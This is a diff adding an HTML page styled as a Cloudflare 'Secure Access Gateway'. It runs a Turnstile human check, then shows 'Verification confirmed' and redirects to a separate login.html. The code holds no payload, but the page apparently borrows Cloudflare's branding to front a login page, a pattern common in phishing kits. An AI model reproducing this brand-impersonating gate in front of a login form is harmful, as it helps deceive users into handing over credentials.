@@ -1,0 +1,188 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cloudflare Secure Access</title>
+    <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
+    <style>
+        :root {
+            --cf-dark-bg: #0C1120;
+            --cf-dark-surface: #1A2333;
+            --cf-dark-border: #2D3B52;
+            --cf-primary: #0038FF;
+            --cf-text-primary: #F0F2FC;
+            --cf-text-secondary: #8C9DB5;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Inter', system-ui, -apple-system, sans-serif;
+        }
+
+        body {
+            background: linear-gradient(225deg, var(--cf-dark-bg) 0%, var(--cf-dark-surface) 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: var(--cf-text-primary);
+        }
+
+        .container {
+            max-width: 560px; /* Increased width */
+            width: 100%;
+            padding: 2rem;
+            margin: 0 auto;
+        }
+
+        .logo-container {
+            text-align: center;
+            margin-bottom: 3rem; /* Increased spacing */
+        }
+
+        .logo {
+            width: 160px; /* Larger logo */
+            margin-bottom: 2rem;
+            
+        }
+
+        .title {
+            font-size: 1.75rem; /* Larger title */
+            font-weight: 600;
+            color: var(--cf-text-primary);
+            margin-bottom: 0.75rem;
+        }
+
+        .subtitle {
+            color: var(--cf-text-secondary);
+            margin-bottom: 2.5rem;
+            font-size: 1rem;
+        }
+
+        .auth-box {
+            background: var(--cf-dark-surface);
+            border-radius: 12px;
+            padding: 3rem;
+            border: 1px solid var(--cf-dark-border);
+            box-shadow: 0 8px 16px rgba(0, 0, 0, 0.2);
+            min-height: 300px;
+            display: flex;
+            flex-direction: column;
+            align-items: center; /* Added for horizontal centering */
+            justify-content: center; /* Added for vertical centering */
+        }
+
+        .cf-turnstile {
+            margin: 2rem 0;
+            width: 100%;
+            display: flex;
+            justify-content: center; /* Center horizontally */
+            transform: none; /* Removed previous scaling */
+        }
+
+        .status-message {
+            font-size: 1rem;
+            color: var(--cf-text-primary);
+            text-align: center;
+            padding: 1.25rem;
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 8px;
+            margin-top: 2rem;
+            opacity: 0;
+            transition: opacity 0.3s ease;
+        }
+
+        .loading-bar {
+            height: 4px; /* Thicker bar */
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 2px;
+            margin-top: 2rem;
+            overflow: hidden;
+            position: relative;
+        }
+
+        .loading-progress {
+            width: 0%;
+            height: 100%;
+            background: var(--cf-primary);
+            transition: width 0.5s ease;
+            position: absolute;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .fade-in {
+            animation: fadeIn 0.4s ease-out;
+        }
+
+        @media (max-width: 480px) {
+            .container {
+                padding: 1.5rem;
+            }
+            
+            .auth-box {
+                padding: 2rem;
+                min-height: 280px;
+            }
+            
+            .logo {
+                width: 140px;
+            }
+            
+            .title {
+                font-size: 1.5rem;
+            }
+            
+            .cf-turnstile {
+                transform: scale(1);
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo-container fade-in">
+            <img src="cloudflare.png" alt="Cloudflare" class="logo">
+            <h1 class="title">Secure Access Gateway</h1>
+            <p class="subtitle">Verify your identity to continue</p>
+        </div>
+        
+        <div class="auth-box fade-in">
+        <div class="cf-turnstile" 
+             data-sitekey="0x4AAAAAAA-HUBpovgMUuiTc"
+             data-callback="onSuccess"
+             data-theme="dark"
+             data-language="en"
+             data-appearance="always"
+             data-retry="auto"
+             data-retry-interval="1000"
+             data-auto="true"></div>
+        
+        <div class="status-message" id="status">Verification confirmed. Redirecting...</div>
+        <div class="loading-bar">
+            <div class="loading-progress" id="loader"></div>
+        </div>
+    </div>
+    </div>
+
+    <script>
+        function onSuccess(token) {
+            const status = document.getElementById('status');
+            const loader = document.getElementById('loader');
+            
+            status.style.opacity = '1';
+            loader.style.width = '100%';
+            
+            setTimeout(() => {
+                window.location.href = 'login.html';
+            }, 1500);
+        }
+    </script>
+</body>
+</html>
